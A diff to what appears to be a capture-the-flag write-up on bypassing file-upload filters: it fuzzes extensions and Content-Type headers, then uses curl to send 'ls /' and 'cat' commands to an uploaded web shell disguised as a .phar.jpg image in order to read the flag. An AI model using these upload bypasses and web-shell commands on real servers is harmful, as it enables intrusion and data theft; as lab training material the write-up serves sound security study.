@@ -117,14 +117,12 @@ Notice that the green button allows us to test if the image can be uploaded with
 
 - First we'll up load a .png and use Burp Suite to add an extention before .png. Well use the wordlist: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
 
-
         ------geckoformboundary1c3064ee08fbac913b71e2f796f8229c
         Content-Disposition: form-data; name="uploadFile"; filename="pic$ext$.png"
         Content-Type: image/png
 
 
 After fuzzing, we can find the successful uploads by looking at the longest the Responces: 
-
 
 <p align="center">
     <img width="1920" height="1045" alt="sc-fuzz-ext" src="https://github.com/user-attachments/assets/6798589a-7f47-48ce-a527-eddf8ad5306d" />
@@ -136,6 +134,12 @@ After fuzzing, we can find the successful uploads by looking at the longest the 
 Now lets determine what content-types are acceptable, well make a custom wordlist with only image types:
 
     cat /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt | grep image/ > wl-webcontent.txt
+
+- We can now test out the Content-Type parameter.
+
+    ------geckoformboundary1c3064ee08fbac913b71e2f796f8229c
+    Content-Disposition: form-data; name="uploadFile"; filename="pic.png"
+    Content-Type: $ct$
 
 <p align="center">
     <img width="1920" height="1045" alt="sc-fuzz-ct" src="https://github.com/user-attachments/assets/2b3dbb9e-387e-4314-b51c-defc2c1d1f9d" />
@@ -162,7 +166,7 @@ Next, lets insepct the upload file to see if we can find where its storing the f
 - If we decode the base64 string we get:
 
 <p align="center">
-    <img width="658" height="882" alt="sc-upload" src="https://github.com/user-attachments/assets/58083f0a-3588-401b-986b-e8ab90646bbc" />
+    <img width="605" height="159" alt="sc-soursecode_upload" src="https://github.com/user-attachments/assets/301bb086-d82a-45b8-b895-ec74f808828e" />
 </p>
 
 
@@ -179,9 +183,15 @@ Now that we know how to find the files, lets upload a shell:
 
 - As we can see the upload was successful!
 
+
 First thing we should do is test out the shell by listing the contents of the root directory:
-
-
 
     curl -X POST http://154.57.164.71:31679/contact/user_feedback_submissions/260719_shell.phar.jpg -d "cmd=ls /" --output results.txt; cat results.txt
 
+From the output we see that the flag is titled:
+
+    flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+
+We can now get the flag with:
+
+    curl -X POST http://154.57.164.71:31679/contact/user_feedback_submissions/260719_shell.phar.jpg -d "cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt" --output results.txt; cat results.txt
